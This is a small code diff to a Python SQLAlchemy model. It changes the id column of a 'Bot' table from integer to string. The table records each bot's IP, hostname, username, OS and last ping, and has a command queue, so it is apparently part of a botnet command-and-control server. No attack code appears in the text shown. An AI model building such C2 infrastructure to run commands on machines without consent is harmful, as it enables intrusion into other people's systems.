@@ -6,7 +6,7 @@ db = SQLAlchemy()
 #Model for a Bot has id, ip, hostname,username, os, last_ping, constructors, and a func to push a command to its table of commands
 class Bot(db.Model):
 	__tablename__ = 'bots'
-	id = db.Column(db.Integer, primary_key = True)
+	id = db.Column(db.String(), primary_key = True)
 	ip = db.Column(db.String(150), unique = True, nullable = False)
 	hostname = db.Column(db.String(150))
 	username = db.Column(db.String(150))
